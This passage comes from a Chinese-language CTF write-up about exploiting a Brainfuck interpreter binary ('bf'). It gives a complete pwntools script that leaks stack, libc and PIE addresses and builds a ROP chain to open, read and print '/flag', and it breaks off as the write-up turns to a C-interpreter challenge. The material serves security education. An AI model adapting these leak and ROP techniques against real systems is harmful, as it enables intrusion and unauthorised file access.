    ROP_chain += p64(1)
    ROP_chain += p64(libc.address + 0x00000000000d2975)
    # exit(0)
    ROP_chain += p64(libc.address + 0x000000000002155f)
    ROP_chain += p64(0)
    ROP_chain += p64(libc.address + 0x00000000000439c8)
    ROP_chain += p64(60)
    ROP_chain += p64(libc.address + 0x00000000000d2975)
    for i in ['[',']']:
        if i in ROP_chain:
            raise ValueError('ROP_chain ERROR')
  8. 接下来我们选择不跳出循环。 
        sh.recvuntil('want to continue?')
    sh.send('y')
  9. 覆盖返回地址，并恢复`code`指针。 
        sh.recvuntil('enter your code:')
    sh.sendline(p64(0) + ROP_chain)
    sh.recvuntil('want to continue?')
    sh.send('y')
    sh.recvuntil('enter your code:')
    sh.sendline('+[>.+],')
    sh.send(p8((code_low_addr) & 0xFF))
    sh.send(p8((code_low_addr) & 0xFF))
  10. 跳出循环即可获取`flag`。
###  FInal Exploit
⚠️：概率成功，因为有概率我们不能成功的触发`[`和`]`的漏洞。
    from pwn import *
    import traceback
    import sys
    context.log_level='debug'
    context.arch='amd64'
    # context.arch='i386'
    bf=ELF('./bf', checksec = False)
    if context.arch == 'amd64':
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
    elif context.arch == 'i386':
        try:
            libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
        except:
            libc=ELF("/lib32/libc.so.6", checksec = False)
    def get_sh(Use_other_libc = False , Use_ssh = False):
        global libc
        if args['REMOTE'] :
            if Use_other_libc :
                libc = ELF("./", checksec = False)
            if Use_ssh :
                s = ssh(sys.argv[3],sys.argv[1], sys.argv[2],sys.argv[4])
                return s.process("./bf")
            else:
                return remote(sys.argv[1], sys.argv[2])
        else:
            return process("./bf")
    def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
        if start_string != None:
            sh.recvuntil(start_string)
        if int_mode :
            return_address = int(sh.recvuntil(end_string,drop=True),16)
        elif address_len != None:
            return_address = u64(sh.recv()[:address_len].ljust(8,'x00'))
        elif context.arch == 'amd64':
            return_address=u64(sh.recvuntil(end_string,drop=True).ljust(8,'x00'))
        else:
            return_address=u32(sh.recvuntil(end_string,drop=True).ljust(4,'x00'))
        if offset != None:
            return_address = return_address + offset
        if info != None:
            log.success(info + str(hex(return_address)))
        return return_address
    def get_flag(sh):
        sh.sendline('cat /flag')
        return sh.recvrepeat(0.3)
    def get_gdb(sh,gdbscript=None,stop=False):
        gdb.attach(sh,gdbscript=gdbscript)
        if stop :
            raw_input()
    def Multi_Attack():
        # testnokill.__main__()
        return
    def Attack(sh=None,ip=None,port=None):
        while True:
            try:
                sh = get_sh()
                # Your Code here
                sh.recvuntil('enter your code:' , timeout = 0.3)
                sh.sendline('+[>.+],')
                sh.recvuntil('x00' * 0x3FF)
                code_low_addr = u64(sh.recv(1).ljust(8,'x00'))
                success("code low bit --> " + str(hex(code_low_addr)))
                payload = code_low_addr + 0x20
                payload = p8((payload) & 0xFF)
                sh.send(payload)
                sh.recvuntil("done! your code: ", timeout = 0.3)
                esp_addr = u64(sh.recv(6).ljust(8,'x00')) - 0x5C0
                info('ESP addr-->'+str(hex(esp_addr)))
                sh.recvuntil('want to continue?' , timeout = 0.3)
                sh.send('y')
                sh.recvuntil('enter your code:' , timeout = 0.3)
                sh.sendline('+[>.+],')
                sh.send(p8((code_low_addr + 0x38) & 0xFF))
                sh.recvuntil("done! your code: ", timeout = 0.3)
                libc.address = u64(sh.recv(6).ljust(8,'x00')) + 0x00007fd6723b7000 - 0x7fd6723d8b97
                info('LIBC ADDRESS --> ' + str(hex(libc.address)))
                sh.recvuntil('want to continue?' , timeout = 0.3)
                sh.send('y')
                sh.recvuntil('enter your code:' , timeout = 0.3)
                sh.sendline('+[>.+],')
                sh.send(p8((code_low_addr + 0x30) & 0xFF))
                sh.recvuntil("done! your code: ", timeout = 0.3)
                PIE_address = u64(sh.recv(6).ljust(8,'x00')) - 0x4980
                info('PIE ADDRESS --> ' + str(hex(PIE_address)))
                # read(0,BSS+0x400,0x20)
                ROP_chain  = p64(libc.address + 0x000000000002155f)
                ROP_chain += p64(0)
                ROP_chain += p64(libc.address + 0x0000000000023e6a)
                ROP_chain += p64(PIE_address + bf.bss() + 0x400)
                ROP_chain += p64(libc.address + 0x0000000000001b96)
                ROP_chain += p64(0x20)
                ROP_chain += p64(libc.address + 0x00000000000439c8)
                ROP_chain += p64(0)
                ROP_chain += p64(libc.address + 0x00000000000d2975)
                # open(BSS+0x400,0)
                ROP_chain += p64(libc.address + 0x000000000002155f)
                ROP_chain += p64(PIE_address + bf.bss() + 0x400)
                ROP_chain += p64(libc.address + 0x0000000000023e6a)
                ROP_chain += p64(0)
                ROP_chain += p64(libc.address + 0x00000000000439c8)
                ROP_chain += p64(2)
                ROP_chain += p64(libc.address + 0x00000000000d2975)
                # read(3,BSS+0x500,0x20)
                ROP_chain += p64(libc.address + 0x000000000002155f)
                ROP_chain += p64(3)
                ROP_chain += p64(libc.address + 0x0000000000023e6a)
                ROP_chain += p64(PIE_address + bf.bss() + 0x500)
                ROP_chain += p64(libc.address + 0x0000000000001b96)
                ROP_chain += p64(0x20)
                ROP_chain += p64(libc.address + 0x00000000000439c8)
                ROP_chain += p64(0)
                ROP_chain += p64(libc.address + 0x00000000000d2975)
                # write(0,BSS+0x500,0x20)
                ROP_chain += p64(libc.address + 0x000000000002155f)
                ROP_chain += p64(1)
                ROP_chain += p64(libc.address + 0x0000000000023e6a)
                ROP_chain += p64(PIE_address + bf.bss() + 0x500)
                ROP_chain += p64(libc.address + 0x0000000000001b96)
                ROP_chain += p64(0x20)
                ROP_chain += p64(libc.address + 0x00000000000439c8)
                ROP_chain += p64(1)
                ROP_chain += p64(libc.address + 0x00000000000d2975)
                # exit(0)
                ROP_chain += p64(libc.address + 0x000000000002155f)
                ROP_chain += p64(0)
                ROP_chain += p64(libc.address + 0x00000000000439c8)
                ROP_chain += p64(60)
                ROP_chain += p64(libc.address + 0x00000000000d2975)
                for i in ['[',']']:
                    if i in ROP_chain:
                        raise ValueError('ROP_chain ERROR')
                sh.recvuntil('want to continue?' , timeout = 0.3)
                sh.send('y')
                sh.recvuntil('enter your code:' , timeout = 0.3)
                sh.sendline(p64(0) + ROP_chain)
                sh.recvuntil('want to continue?' , timeout = 0.3)
                sh.send('y')
                sh.recvuntil('enter your code:' , timeout = 0.3)
                sh.sendline('+[>.+],')
                sh.send(p8((code_low_addr) & 0xFF))
                sh.send(p8((code_low_addr) & 0xFF))
                # get_gdb(sh)
                sh.recvuntil('want to continue?' , timeout = 0.3)
                sh.send('n')
                sh.send('/flag')
                # sh.interactive()
                flag = sh.recvrepeat(0.3)
                sh.close()
                return flag
            except Exception as e:
                traceback.print_exc()
                sh.close()
                continue
    if __name__ == "__main__":
        flag = Attack()
        log.success('The flag is ' + re.search(r'flag{.+}',flag).group())
## 0x05 以 2020 DAS-CTF OJ0 为例
> 安恒月赛的题目为闭源信息，本例题不会给出任何形式的附件下载地址
###  题目信息
可以发现，这是一个C语言的解释器，可以执行我们输入的任意代码，然后依据题目要求输出指定信息后，会执行`tree
/home/ctf`命令，从而告知我们`flag`文件的具体位置。
接下来我们需要构造代码进行`flag`的读取。
###  漏洞利用